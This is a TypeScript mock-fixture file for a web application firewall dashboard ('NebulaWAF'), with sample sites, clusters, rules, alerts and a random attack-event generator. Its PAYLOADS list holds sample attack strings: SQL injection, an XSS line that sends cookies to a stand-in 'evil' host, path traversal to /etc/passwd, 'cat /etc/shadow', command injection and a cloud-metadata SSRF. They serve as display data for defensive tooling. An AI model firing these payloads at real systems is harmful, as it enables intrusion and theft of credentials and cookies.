/* NebulaWAF mock fixtures + helpers. */

export interface AttackType {
  code: string
  label: string
  color: string
}

export interface Region {
  name: string
  country: string
  lat: number
  lng: number
}

export interface Site {
  id: string
  name: string
  domain: string
  proto: string
  upstream: string
  instance: string
  rps: number
  blockedRate: number
  state: 'protected' | 'observe' | 'paused'
}

export interface Instance {
  id: string
  cluster: string
  ip: string
  cpu: number
  mem: number
  conn: number
  qps: number
  tp: string
  state: 'online' | 'busy' | 'offline'
  uptime: string
}

export interface Cluster {
  id: string
  name: string
  nodes: number
  vip: string
  algo: string
  state: 'ok' | 'warn' | 'critical'
  site_count: number
}

export interface Rule {
  id: string
  name: string
  scope: string
  field: string
  match: string
  action: 'block' | 'allow' | 'rate' | 'challenge' | 'log'
  priority: number
  enabled: boolean
  builtin: boolean
  hits: number
}

export interface Alert {
  id: string
  t: string
  level: 'critical' | 'warn' | 'info'
  kind: string
  site: string
  msg: string
  status: 'open' | 'ack' | 'closed'
  ack: boolean
}

export interface AttackEvent {
  id: string
  t: string
  ts: number
  ip: string
  region: string
  country: string
  lat: number
  lng: number
  site: string
  domain: string
  type: string
  typeLabel: string
  typeColor: string
  risk: '高' | '中' | '低'
  action: 'blocked' | 'challenged' | 'logged'
  method: string
  uri: string
  payload: string
  ruleId: string
  ua: string
}

export const ATTACK_TYPES: AttackType[] = [
  { code: 'SQLi', label: 'SQL 注入', color: '#ef4444' },
  { code: 'XSS', label: 'XSS', color: '#f59e0b' },
  { code: 'CMDi', label: '命令注入', color: '#a855f7' },
  { code: 'LFI', label: '目录遍历', color: '#ec4899' },
  { code: 'RFI', label: '文件包含', color: '#22d3ee' },
  { code: 'CC', label: 'CC 攻击', color: '#ef4444' },
  { code: 'BOT', label: '恶意 Bot', color: '#f59e0b' },
  { code: 'BF', label: '暴力破解', color: '#a855f7' },
  { code: 'SSRF', label: 'SSRF', color: '#ec4899' },
  { code: 'WS', label: 'Web Shell', color: '#dc2626' },
  { code: 'SCAN', label: '扫描探测', color: '#22d3ee' },
  { code: 'API', label: 'API 滥用', color: '#10b981' },
]

export const REGIONS: Region[] = [
  { name: '中国 北京', country: 'CN', lat: 39.9, lng: 116.4 },
  { name: '中国 上海', country: 'CN', lat: 31.2, lng: 121.5 },
  { name: '中国 香港', country: 'HK', lat: 22.3, lng: 114.2 },
  { name: '美国 弗吉尼亚', country: 'US', lat: 38.0, lng: -78.5 },
  { name: '美国 加州', country: 'US', lat: 37.4, lng: -122.1 },
  { name: '俄罗斯 莫斯科', country: 'RU', lat: 55.7, lng: 37.6 },
  { name: '德国 法兰克福', country: 'DE', lat: 50.1, lng: 8.7 },
  { name: '荷兰 阿姆斯特丹', country: 'NL', lat: 52.4, lng: 4.9 },
  { name: '英国 伦敦', country: 'GB', lat: 51.5, lng: -0.1 },
  { name: '日本 东京', country: 'JP', lat: 35.7, lng: 139.7 },
  { name: '韩国 首尔', country: 'KR', lat: 37.6, lng: 127.0 },
  { name: '新加坡', country: 'SG', lat: 1.35, lng: 103.8 },
  { name: '印度 孟买', country: 'IN', lat: 19.1, lng: 72.9 },
  { name: '巴西 圣保罗', country: 'BR', lat: -23.5, lng: -46.6 },
  { name: '越南 河内', country: 'VN', lat: 21.0, lng: 105.8 },
  { name: '伊朗 德黑兰', country: 'IR', lat: 35.7, lng: 51.4 },
]

export const SITES: Site[] = [
  {
    id: 'site-1',
    name: '官网主站',
    domain: 'www.example.com',
    proto: 'HTTPS',
    upstream: '10.20.1.10:8443',
    instance: 'asg-cluster-01',
    rps: 1840,
    blockedRate: 3.2,
    state: 'protected',
  },
  {
    id: 'site-2',
    name: 'API 网关',
    domain: 'api.example.com',
    proto: 'HTTPS',
    upstream: '10.20.2.20:9000',
    instance: 'asg-cluster-02',
    rps: 12800,
    blockedRate: 1.8,
    state: 'protected',
  },
  {
    id: 'site-3',
    name: '运营管理后台',
    domain: 'admin.example.com',
    proto: 'HTTPS',
    upstream: '10.20.3.30:8081',
    instance: 'asg-cluster-01',
    rps: 78,
    blockedRate: 8.6,
    state: 'protected',
  },
  {
    id: 'site-4',
    name: '静态资源 CDN',
    domain: 'static.example.com',
    proto: 'HTTPS',
    upstream: '10.20.4.40:80',
    instance: 'asg-cluster-03',
    rps: 35400,
    blockedRate: 0.3,
    state: 'protected',
  },
  {
    id: 'site-5',
    name: '移动端网关',
    domain: 'm.example.com',
    proto: 'HTTPS',
    upstream: '10.20.5.50:8443',
    instance: 'asg-cluster-02',
    rps: 4860,
    blockedRate: 2.1,
    state: 'protected',
  },
  {
    id: 'site-6',
    name: '支付服务',
    domain: 'pay.example.com',
    proto: 'HTTPS',
    upstream: '10.20.6.60:8443',
    instance: 'asg-cluster-04',
    rps: 920,
    blockedRate: 4.7,
    state: 'protected',
  },
  {
    id: 'site-7',
    name: '内部 OA',
    domain: 'oa.example.com',
    proto: 'HTTPS',
    upstream: '10.20.7.70:8080',
    instance: 'asg-cluster-01',
    rps: 240,
    blockedRate: 1.2,
    state: 'observe',
  },
  {
    id: 'site-8',
    name: '客服中心',
    domain: 'help.example.com',
    proto: 'HTTPS',
    upstream: '10.20.8.80:80',
    instance: 'asg-cluster-03',
    rps: 180,
    blockedRate: 0.6,
    state: 'paused',
  },
]

export const INSTANCES: Instance[] = [
  {
    id: 'asg-01',
    cluster: 'asg-cluster-01',
    ip: '10.0.1.11',
    cpu: 34,
    mem: 45,
    conn: 1250,
    qps: 2400,
    tp: '2.4 Gbps',
    state: 'online',
    uptime: '15d 4h',
  },
  {
    id: 'asg-02',
    cluster: 'asg-cluster-01',
    ip: '10.0.1.12',
    cpu: 62,
    mem: 58,
    conn: 2100,
    qps: 3100,
    tp: '3.1 Gbps',
    state: 'busy',
    uptime: '30d 2h',
  },
  {
    id: 'asg-03',
    cluster: 'asg-cluster-02',
    ip: '10.0.2.11',
    cpu: 22,
    mem: 31,
    conn: 890,
    qps: 5800,
    tp: '5.8 Gbps',
    state: 'online',
    uptime: '7d 8h',
  },
  {
    id: 'asg-04',
    cluster: 'asg-cluster-02',
    ip: '10.0.2.12',
    cpu: 18,
    mem: 28,
    conn: 650,
    qps: 4900,
    tp: '4.9 Gbps',
    state: 'online',
    uptime: '7d 8h',
  },
  {
    id: 'asg-05',
    cluster: 'asg-cluster-03',
    ip: '10.0.3.11',
    cpu: 71,
    mem: 64,
    conn: 4200,
    qps: 32100,
    tp: '6.1 Gbps',
    state: 'busy',
    uptime: '60d 12h',
  },
  {
    id: 'asg-06',
    cluster: 'asg-cluster-03',
    ip: '10.0.3.12',
    cpu: 0,
    mem: 0,
    conn: 0,
    qps: 0,
    tp: '—',
    state: 'offline',
    uptime: '—',
  },
  {
    id: 'asg-07',
    cluster: 'asg-cluster-04',
    ip: '10.0.4.11',
    cpu: 41,
    mem: 39,
    conn: 1180,
    qps: 1900,
    tp: '1.9 Gbps',
    state: 'online',
    uptime: '21d 3h',
  },
  {
    id: 'asg-08',
    cluster: 'asg-cluster-04',
    ip: '10.0.4.12',
    cpu: 38,
    mem: 42,
    conn: 1050,
    qps: 1700,
    tp: '1.7 Gbps',
    state: 'online',
    uptime: '21d 3h',
  },
]

export const CLUSTERS: Cluster[] = [
  {
    id: 'asg-cluster-01',
    name: '主防护集群-华东',
    nodes: 2,
    vip: '10.0.1.100',
    algo: '加权轮询',
    state: 'ok',
    site_count: 3,
  },
  {
    id: 'asg-cluster-02',
    name: 'API 高吞吐集群',
    nodes: 2,
    vip: '10.0.2.100',
    algo: '最小连接',
    state: 'ok',
    site_count: 2,
  },
  {
    id: 'asg-cluster-03',
    name: '静态加速集群',
    nodes: 2,
    vip: '10.0.3.100',
    algo: 'IP Hash',
    state: 'warn',
    site_count: 2,
  },
  {
    id: 'asg-cluster-04',
    name: '支付独立集群',
    nodes: 2,
    vip: '10.0.4.100',
    algo: 'RR + sticky',
    state: 'ok',
    site_count: 1,
  },
]

export const RULES: Rule[] = [
  {
    id: 'r-1001',
    name: 'OWASP CRS — SQL 注入',
    scope: '全部站点',
    field: 'body, query',
    match: '正则集',
    action: 'block',
    priority: 1,
    enabled: true,
    builtin: true,
    hits: 23410,
  },
  {
    id: 'r-1002',
    name: 'OWASP CRS — XSS 综合',
    scope: '全部站点',
    field: 'header, body',
    match: '正则集',
    action: 'block',
    priority: 2,
    enabled: true,
    builtin: true,
    hits: 14209,
  },
  {
    id: 'r-1003',
    name: '可信运维 IP 段',
    scope: '管理后台',
    field: 'client.ip',
    match: 'CIDR',
    action: 'allow',
    priority: 3,
    enabled: true,
    builtin: false,
    hits: 8642,
  },
  {
    id: 'r-1004',
    name: 'API 频率限制',
    scope: 'API 网关',
    field: 'uri',
    match: '前缀',
    action: 'rate',
    priority: 4,
    enabled: true,
    builtin: false,
    hits: 5420,
  },
  {
    id: 'r-1005',
    name: '恶意 User-Agent 黑名单',
    scope: '全部站点',
    field: 'header.UA',
    match: '正则',
    action: 'block',
    priority: 5,
    enabled: true,
    builtin: false,
    hits: 4198,
  },
  {
    id: 'r-1006',
    name: '高风险地区拦截 (受限)',
    scope: '管理后台',
    field: 'geo.country',
    match: '集合',
    action: 'block',
    priority: 6,
    enabled: true,
    builtin: false,
    hits: 2080,
  },
  {
    id: 'r-1007',
    name: 'WebShell 上传检测',
    scope: '全部站点',
    field: 'multipart',
    match: '内容指纹',
    action: 'block',
    priority: 7,
    enabled: true,
    builtin: true,
    hits: 1245,
  },
  {
    id: 'r-1008',
    name: 'JWT 重放保护',
    scope: 'API 网关',
    field: 'header.Auth',
    match: '语义',
    action: 'challenge',
    priority: 8,
    enabled: true,
    builtin: false,
    hits: 902,
  },
  {
    id: 'r-1009',
    name: 'Bot 指纹挑战',
    scope: '全部站点',
    field: 'tls fp + UA',
    match: '指纹库',
    action: 'challenge',
    priority: 9,
    enabled: true,
    builtin: true,
    hits: 18460,
  },
  {
    id: 'r-1010',
    name: '调试用 — 仅记录',
    scope: '官网主站',
    field: 'uri',
    match: '正则',
    action: 'log',
    priority: 10,
    enabled: false,
    builtin: false,
    hits: 0,
  },
]

export const ALERTS: Alert[] = [
  {
    id: 'a-1',
    t: '15:32:05',
    level: 'critical',
    kind: 'CC 攻击',
    site: '官网主站',
    msg: 'CC 攻击突增 580%,触发自动挑战策略',
    status: 'open',
    ack: false,
  },
  {
    id: 'a-2',
    t: '15:28:12',
    level: 'warn',
    kind: '资源告警',
    site: 'asg-02',
    msg: 'CPU 使用率持续 5 分钟超过 85%',
    status: 'open',
    ack: false,
  },
  {
    id: 'a-3',
    t: '14:55:30',
    level: 'critical',
    kind: '实例离线',
    site: 'asg-06',
    msg: '实例失联 > 5 分钟,疑似宿主机异常',
    status: 'open',
    ack: false,
  },
  {
    id: 'a-4',
    t: '14:12:08',
    level: 'warn',
    kind: '证书到期',
    site: 'pay.example.com',
    msg: 'TLS 证书将于 7 天后到期',
    status: 'ack',
    ack: true,
  },
  {
    id: 'a-5',
    t: '12:40:01',
    level: 'info',
    kind: '规则更新',
    site: '—',
    msg: 'OWASP CRS 升级至 4.0.0 已应用',
    status: 'closed',
    ack: true,
  },
]

const PAYLOADS = [
  "?id=1' UNION SELECT password FROM users--",
  "<script>fetch('//evil/'+document.cookie)</script>",
  '../../../etc/passwd',
  '; cat /etc/shadow',
  '%c0%ae%c0%ae/etc/passwd',
  '<svg onload=alert(1)>',
  '/admin/.git/config',
  '?cmd=id;whoami',
  '?url=http://169.254.169.254/latest/meta-data/',
  '?file=php://filter/convert.base64-encode/resource=index',
  '?lang=../../../../etc/passwd%00',
  'Bearer eyJhbGciOiJIUzI1NiJ9.****.replay',
]

const URIS = [
  '/index.php',
  '/api/v1/users',
  '/admin/login',
  '/wp-admin/',
  '/.env',
  '/api/v2/orders',
  '/login.php',
  '/uploads/',
  '/api/v1/auth',
  '/phpmyadmin/',
]

export function rIP(): string {
  return `${1 + Math.floor(Math.random() * 222)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export function pick<T>(arr: readonly T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

export function mkAttack(): AttackEvent {
  const ts = new Date(Date.now() - Math.random() * 3_600_000)
  const region = pick(REGIONS)
  const at = pick(ATTACK_TYPES)
  const site = pick(SITES.slice(0, 6))
  const action: AttackEvent['action'] =
    Math.random() > 0.92 ? 'logged' : Math.random() > 0.85 ? 'challenged' : 'blocked'
  const riskIdx = Math.floor(
    Math.random() * 3 + (at.code === 'SQLi' || at.code === 'WS' ? 0 : Math.random()),
  )
  const riskLabel: AttackEvent['risk'] = riskIdx === 0 ? '高' : riskIdx === 1 ? '中' : '低'
  return {
    id: `e-${Math.random().toString(36).slice(2, 9)}`,
    t: `${ts.toTimeString().slice(0, 8)}.${String(Math.floor(Math.random() * 1000)).padStart(3, '0')}`,
    ts: ts.getTime(),
    ip: rIP(),
    region: region.name,
    country: region.country,
    lat: region.lat,
    lng: region.lng,
    site: site.name,
    domain: site.domain,
    type: at.code,
    typeLabel: at.label,
    typeColor: at.color,
    risk: riskLabel,
    action,
    method: pick(['GET', 'POST', 'POST', 'POST', 'PUT', 'GET']),
    uri: pick(URIS),
    payload: pick(PAYLOADS),
    ruleId: pick([
      '941100',
      '942100',
      '933160',
      '930120',
      '921180',
      `9320${Math.floor(Math.random() * 100)}`,
    ]),
    ua: pick([
      'curl/7.81',
      'python-requests/2.31',
      'sqlmap/1.7',
      'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101',
      'masscan/1.3',
    ]),
  }
}
